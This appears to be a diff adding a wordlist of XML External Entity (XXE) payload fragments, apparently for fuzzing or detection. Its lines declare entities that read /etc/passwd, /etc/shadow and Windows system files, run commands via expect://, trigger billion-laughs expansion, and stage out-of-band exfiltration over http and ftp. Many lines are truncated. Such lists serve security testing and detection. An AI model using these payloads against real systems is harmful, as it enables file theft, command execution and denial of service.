@@ -1,0 +1,66 @@
+<pass>`mypass`</pass>
+<!ENTITY xxe SYSTEM "expect://id" >]>
+<!ENTITY xxe SYSTEM "file:///etc/passwd"
+<!ENTITY xxe SYSTEM "file:///etc/shadow"
+<!ENTITY xxe SYSTEM "file:///c:/boot.ini"
+etc/passwd
+etc/shadow
+boot.ini
+<foo>&xxe;</foo>
+<!ENTITY xxe SYSTEM "http
+&lol;&lol
+&lol1;&lol1
+&lol2;&lol2
+&lol3;&lol3
+&lol4;&lol4
+&lol5;&lol5
+&lol6;&lol6
+<!ENTITY ac SYSTEM "php
+<!ENTITY test SYSTEM "http
++ADwAIQ-ENTITY xxe SYSTEM +ACI-http
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64
+<!DOCTYPE test [ <!ENTITY % init SYSTEM "data
+<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http
+<image xlink:href="expect://ls
+<image xlink:href="expect://ls"></image>
+<!ENTITY % sp SYSTEM "http
+<!ENTITY sp SYSTEM "http
+<!ENTITY % data SYSTEM "file:///c:/windows/win.ini
+<!ENTITY % data3 SYSTEM "file
+exfil SYSTEM 'ftp
+external SYSTEM "file:
+<!ENTITY % dtd SYSTEM "http
+<!ENTITY % one SYSTEM "http
+<!ENTITY % two "<!ENTITY % four SYSTEM 'file:
+<!ENTITY % three SYSTEM "file:///etc/passwd">
+<!ENTITY % asd SYSTEM "http
+<!ENTITY % c "<!ENTITY rrr SYSTEM 'ftp
+<!DOCTYPE :. SYTEM "http
+<!DOCTYPE :_-_: SYTEM "http
+<!DOCTYPE {0xdfbf} SYSTEM "http
+&a0;&a0;&a0
+&a1;&a1;&a1;&a1
+&a2;&a2;&a2
+<!DOCTYPE data SYSTEM "http://127.0.0.1
+<!ENTITY dos SYSTEM "file
+<!ENTITY file SYSTEM "file
+<!ENTITY file SYSTEM "netdoc
+<!ENTITY % goodies SYSTEM "file
+<!ENTITY % dtd SYSTEM "http
+<!ENTITY % payload SYSTEM
+<!ENTITY % ext SYSTEM
+<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file
+<!ENTITY % condition "and | or | not | equal | contains | exists | subdomain-of">
+<!DOCTYPE data SYSTEM "http
+<!ENTITY % remote SYSTEM "http
+<!DOCTYPE netspi [<!ENTITY xxe SYSTEM
+<data xmlns:xi="http
+<xsl:value-of select="document('/sys/power/image_size')">
+href="file:///etc
+[<!ENTITY toreplace "3">
+SYSTEM "/etc/
+SYSTEM "file:///usr
+init SYSTEM "data://text/plain;base64
+SYSTEM "php:
+<title>XXE Test
+<void method="exec">
